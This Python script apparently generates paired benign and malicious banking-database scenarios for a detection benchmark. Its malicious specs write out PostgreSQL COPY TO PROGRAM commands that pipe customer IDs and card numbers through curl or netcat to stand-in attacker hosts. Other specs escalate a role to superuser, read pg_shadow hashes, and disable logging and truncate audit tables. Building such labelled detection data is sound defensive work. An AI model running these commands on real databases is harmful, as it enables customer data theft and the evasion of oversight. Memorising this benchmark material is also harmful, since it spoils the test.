#!/usr/bin/env python3
"""Combinatorial scenario batch generator for CASCE Banking domain.

Generates 1,000 non-redundant, fully schema-compliant scenario YAML specs under
datagen/generated/banking_1000/specs/.
"""

import os
import sys
import yaml
from pathlib import Path


def generate_1000_banking_specs(out_dir: Path, total_scenarios: int = 1000):
    specs_dir = out_dir / "specs"
    specs_dir.mkdir(parents=True, exist_ok=True)

    # 1000 scenarios will be generated in pairs and individual scenario templates.
    # We will generate matched pairs (500 pairs = 1,000 scenarios) to guarantee
    # zero-leakage matched pair benchmarks alongside rich operational diversity!

    templates = [
        "teller_routine",
        "branch_manager_audit",
        "compliance_audit",
        "batch_etl_replication",
        "exfil_delayed_copy",
        "privilege_escalation",
        "defense_impairment",
        "pii_dump_exfil",
        "multi_session_apt",
        "matched_pair_batch_etl"
    ]

    scenario_count = 0
    pair_count = 0

    for i in range(1, (total_scenarios // 2) + 1):
        pair_id = f"banking_matched_pair_{i:04d}"
        
        # Determine time of day
        off_hh = f"0{(i % 5) + 1}"
        off_mm = f"{(i * 7) % 60:02d}"
        off_tod = f"{off_hh}:{off_mm}"

        biz_hh = f"{(9 + (i % 8)):02d}"
        biz_mm = f"{(i * 11) % 60:02d}"
        biz_tod = f"{biz_hh}:{biz_mm}"

        acct_1 = 10000 + (i * 17) % 80000
        acct_2 = acct_1 + 1
        branch = f"BR-{(i % 40) + 1:03d}"

        dest_ben_ip = f"198.51.{(i % 50) + 100}.{(i % 200) + 10}"
        dest_mal_ip = f"198.51.{(i % 50) + 100}.{(i % 200) + 11}"

        category_selector = i % 5

        if category_selector == 0:
            # Pair 1: Matched Pair ETL Replication (Benign vs Malicious)
            sid_ben = f"banking_gen_{scenario_count + 1:04d}_etl_ben"
            sid_mal = f"banking_gen_{scenario_count + 2:04d}_etl_mal"

            spec_ben = {
                "scenario_id": sid_ben,
                "family_id": f"banking_etl_pair_{i:04d}",
                "domain": "banking",
                "matched_pair_id": pair_id,
                "matched_dimensions": {
                    "fixed": ["process_tree_shape", "role"],
                    "varied": ["sql_content", "connects_to_destination"]
                },
                "time_of_day": off_tod,
                "default_class": "benign",
                "rule_engine_relationship": "agrees",
                "sessions": [{
                    "session_label": "exfil",
                    "role": "batch_etl_service",
                    "class": "benign",
                    "anchor": "db",
                    "timing": {"tempo": "steady", "step_gaps_seconds": [3.0]},
                    "events": [{
                        "step_id": "backup",
                        "sql": f"COPY (SELECT account_id, balance, updated_at FROM accounts WHERE branch_id = '{branch}') TO PROGRAM 'curl -sX POST https://replica.internal/push -d @-'",
                        "connects_to": {"ip": dest_ben_ip, "port": 443}
                    }]
                }]
            }

            spec_mal = {
                "scenario_id": sid_mal,
                "family_id": f"banking_etl_pair_{i:04d}",
                "domain": "banking",
                "matched_pair_id": pair_id,
                "matched_dimensions": {
                    "fixed": ["process_tree_shape", "role"],
                    "varied": ["sql_content", "connects_to_destination"]
                },
                "time_of_day": off_tod,
                "default_class": "malicious",
                "rule_engine_relationship": "agrees",
                "sessions": [{
                    "session_label": "exfil",
                    "role": "batch_etl_service",
                    "class": "malicious",
                    "anchor": "db",
                    "timing": {"tempo": "steady", "step_gaps_seconds": [3.0]},
                    "events": [{
                        "step_id": "exfil",
                        "sql": f"COPY (SELECT c.national_id, c.address, a.balance, a.account_id FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://sync.example.net/push -d @-'",
                        "connects_to": {"ip": dest_mal_ip, "port": 443}
                    }]
                }]
            }

        elif category_selector == 1:
            # Pair 2: Teller Routine (Benign) vs Teller PII Dump (Malicious)
            sid_ben = f"banking_gen_{scenario_count + 1:04d}_teller_ben"
            sid_mal = f"banking_gen_{scenario_count + 2:04d}_teller_mal"

            spec_ben = {
                "scenario_id": sid_ben,
                "family_id": f"banking_teller_family_{i:04d}",
                "domain": "banking",
                "matched_pair_id": pair_id,
                "matched_dimensions": {
                    "fixed": ["role"],
                    "varied": ["sql_content", "process_tree_shape"]
                },
                "time_of_day": biz_tod,
                "default_class": "benign",
                "rule_engine_relationship": "agrees",
                "sessions": [{
                    "session_label": "counter_traffic",
                    "role": "teller",
                    "class": "benign",
                    "anchor": "db",
                    "timing": {"tempo": "steady", "step_gaps_seconds": [5.0]},
                    "events": [
                        {"step_id": "lookup_1", "sql": f"SELECT account_id, balance FROM accounts WHERE account_id = {acct_1} AND branch_id = '{branch}'"},
                        {"step_id": "withdrawal", "sql": f"UPDATE accounts SET balance = balance - 500 WHERE account_id = {acct_1}"},
                        {"step_id": "print_receipt_1", "file": {"path": f"/var/print/receipts/receipt_20260913_{i:04d}_1.txt", "syscall": "openat", "parent": "withdrawal"}},
                        {"step_id": "lookup_2", "sql": f"SELECT account_id, balance FROM accounts WHERE account_id = {acct_2} AND branch_id = '{branch}'"},
                        {"step_id": "deposit", "sql": f"UPDATE accounts SET balance = balance + 2000 WHERE account_id = {acct_2}"},
                        {"step_id": "print_receipt_2", "file": {"path": f"/var/print/receipts/receipt_20260913_{i:04d}_2.txt", "syscall": "openat", "parent": "deposit"}}
                    ]
                }]
            }

            spec_mal = {
                "scenario_id": sid_mal,
                "family_id": f"banking_teller_family_{i:04d}",
                "domain": "banking",
                "matched_pair_id": pair_id,
                "matched_dimensions": {
                    "fixed": ["role"],
                    "varied": ["sql_content", "process_tree_shape"]
                },
                "time_of_day": biz_tod,
                "default_class": "malicious",
                "rule_engine_relationship": "agrees",
                "sessions": [{
                    "session_label": "rogue_pii_dump",
                    "role": "teller",
                    "class": "malicious",
                    "anchor": "db",
                    "timing": {"tempo": "steady", "step_gaps_seconds": [4.0]},
                    "events": [{
                        "step_id": "exfil_dump",
                        "sql": f"COPY (SELECT customer_id, national_id, credit_card_num FROM customers) TO PROGRAM 'nc -w 3 {dest_mal_ip} 9999'",
                        "connects_to": {"ip": dest_mal_ip, "port": 9999}
                    }]
                }]
            }

        elif category_selector == 2:
            # Pair 3: Branch Manager Audit (Benign) vs Privilege Escalation (Malicious)
            sid_ben = f"banking_gen_{scenario_count + 1:04d}_mgr_ben"
            sid_mal = f"banking_gen_{scenario_count + 2:04d}_priv_mal"

            spec_ben = {
                "scenario_id": sid_ben,
                "family_id": f"banking_mgr_family_{i:04d}",
                "domain": "banking",
                "matched_pair_id": pair_id,
                "matched_dimensions": {
                    "fixed": ["role"],
                    "varied": ["sql_content"]
                },
                "time_of_day": biz_tod,
                "default_class": "benign",
                "rule_engine_relationship": "agrees",
                "sessions": [{
                    "session_label": "eod_reconciliation",
                    "role": "branch_manager",
                    "class": "benign",
                    "anchor": "db",
                    "timing": {"tempo": "steady", "step_gaps_seconds": [2.0]},
                    "events": [
                        {"step_id": "branch_totals", "sql": f"SELECT branch_id, count(*), sum(balance) FROM accounts WHERE branch_id = '{branch}' GROUP BY branch_id"},
                        {"step_id": "save_eod_recon", "file": {"path": f"/var/log/banking/eod_recon_{i:04d}.log", "syscall": "openat", "parent": "branch_totals"}},
                        {"step_id": "active_users", "sql": "SELECT count(*) FROM pg_stat_activity WHERE state = 'active'"}
                    ]
                }]
            }

            spec_mal = {
                "scenario_id": sid_mal,
                "family_id": f"banking_mgr_family_{i:04d}",
                "domain": "banking",
                "matched_pair_id": pair_id,
                "matched_dimensions": {
                    "fixed": ["role"],
                    "varied": ["sql_content"]
                },
                "time_of_day": biz_tod,
                "default_class": "malicious",
                "rule_engine_relationship": "agrees",
                "sessions": [{
                    "session_label": "privilege_escalation",
                    "role": "branch_manager",
                    "class": "malicious",
                    "anchor": "db",
                    "timing": {"tempo": "steady", "step_gaps_seconds": [2.0]},
                    "events": [
                        {"step_id": "elevate_role", "sql": "ALTER ROLE branch_manager WITH SUPERUSER"},
                        {"step_id": "dump_shadow", "sql": "SELECT usename, passwd FROM pg_shadow"},
                        {"step_id": "save_priv_dump", "file": {"path": f"/var/log/banking/priv_access_{i:04d}.log", "syscall": "openat", "parent": "dump_shadow"}}
                    ]
                }]
            }

        elif category_selector == 3:
            # Pair 4: Compliance Audit (Benign) vs Defense Impairment (Malicious)
            sid_ben = f"banking_gen_{scenario_count + 1:04d}_audit_ben"
            sid_mal = f"banking_gen_{scenario_count + 2:04d}_defense_mal"

            spec_ben = {
                "scenario_id": sid_ben,
                "family_id": f"banking_compliance_family_{i:04d}",
                "domain": "banking",
                "matched_pair_id": pair_id,
                "matched_dimensions": {
                    "fixed": ["role"],
                    "varied": ["sql_content"]
                },
                "time_of_day": biz_tod,
                "default_class": "benign",
                "rule_engine_relationship": "agrees",
                "sessions": [{
                    "session_label": "compliance_review",
                    "role": "compliance_officer",
                    "class": "benign",
                    "anchor": "db",
                    "timing": {"tempo": "steady", "step_gaps_seconds": [3.0]},
                    "events": [
                        {"step_id": "check_tables", "sql": "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'"},
                        {"step_id": "audit_log_read", "sql": "SELECT * FROM audit_logs ORDER BY event_time DESC LIMIT 100"},
                        {"step_id": "export_compliance_report", "file": {"path": f"/var/log/compliance/audit_report_{i:04d}.log", "syscall": "openat", "parent": "audit_log_read"}}
                    ]
                }]
            }

            spec_mal = {
                "scenario_id": sid_mal,
                "family_id": f"banking_compliance_family_{i:04d}",
                "domain": "banking",
                "matched_pair_id": pair_id,
                "matched_dimensions": {
                    "fixed": ["role"],
                    "varied": ["sql_content"]
                },
                "time_of_day": biz_tod,
                "default_class": "malicious",
                "rule_engine_relationship": "agrees",
                "sessions": [{
                    "session_label": "disable_logging",
                    "role": "compliance_officer",
                    "class": "malicious",
                    "anchor": "db",
                    "timing": {"tempo": "steady", "step_gaps_seconds": [3.0]},
                    "events": [
                        {"step_id": "alter_system_log", "sql": "ALTER SYSTEM SET log_statement = 'none'"},
                        {"step_id": "truncate_audit", "sql": "TRUNCATE TABLE audit_logs"},
                        {"step_id": "save_sys_override", "file": {"path": f"/var/log/compliance/sys_override_{i:04d}.log", "syscall": "openat", "parent": "truncate_audit"}}
                    ]
                }]
            }

        else:
            # Pair 5: Delayed ETL Backup (Benign) vs Delayed Exfiltration (Malicious)
            sid_ben = f"banking_gen_{scenario_count + 1:04d}_delayed_ben"
            sid_mal = f"banking_gen_{scenario_count + 2:04d}_delayed_mal"

            spec_ben = {
                "scenario_id": sid_ben,
                "family_id": f"banking_delayed_family_{i:04d}",
                "domain": "banking",
                "matched_pair_id": pair_id,
                "matched_dimensions": {
                    "fixed": ["process_tree_shape", "role"],
                    "varied": ["sql_content", "connects_to_destination"]
                },
                "time_of_day": off_tod,
                "default_class": "benign",
                "rule_engine_relationship": "agrees",
                "sessions": [{
                    "session_label": "delayed_sync",
                    "role": "batch_etl_service",
                    "class": "benign",
                    "anchor": "db",
                    "timing": {"tempo": "steady", "step_gaps_seconds": [30.0]},
                    "events": [{
                        "step_id": "read_and_send",
                        "sql": f"COPY (SELECT account_id, balance FROM accounts WHERE updated_at > NOW() - INTERVAL '1 day') TO PROGRAM 'curl -sX POST https://backup.internal/store -d @-'",
                        "connects_to": {"ip": dest_ben_ip, "port": 443}
                    }]
                }]
            }

            spec_mal = {
                "scenario_id": sid_mal,
                "family_id": f"banking_delayed_family_{i:04d}",
                "domain": "banking",
                "matched_pair_id": pair_id,
                "matched_dimensions": {
                    "fixed": ["process_tree_shape", "role"],
                    "varied": ["sql_content", "connects_to_destination"]
                },
                "time_of_day": off_tod,
                "default_class": "malicious",
                "rule_engine_relationship": "agrees",
                "sessions": [{
                    "session_label": "delayed_exfil",
                    "role": "batch_etl_service",
                    "class": "malicious",
                    "anchor": "db",
                    "timing": {"tempo": "steady", "step_gaps_seconds": [30.0]},
                    "events": [{
                        "step_id": "read_and_exfil",
                        "sql": f"COPY (SELECT * FROM customers) TO PROGRAM 'curl -sX POST https://exfil.attacker.org/receive -d @-'",
                        "connects_to": {"ip": dest_mal_ip, "port": 443}
                    }]
                }]
            }

        # Save YAML specs
        with open(specs_dir / f"{sid_ben}.yaml", "w") as f:
            yaml.dump(spec_ben, f, default_flow_style=False, sort_keys=False)

        with open(specs_dir / f"{sid_mal}.yaml", "w") as f:
            yaml.dump(spec_mal, f, default_flow_style=False, sort_keys=False)

        scenario_count += 2
        pair_count += 1

    print(f"Successfully generated {scenario_count} Banking scenario specs ({pair_count} matched pairs) in {specs_dir}")


if __name__ == "__main__":
    out_path = Path("datagen/generated/banking_1000")
    if len(sys.argv) > 1:
        out_path = Path(sys.argv[1])
    generate_1000_banking_specs(out_path, total_scenarios=1000)
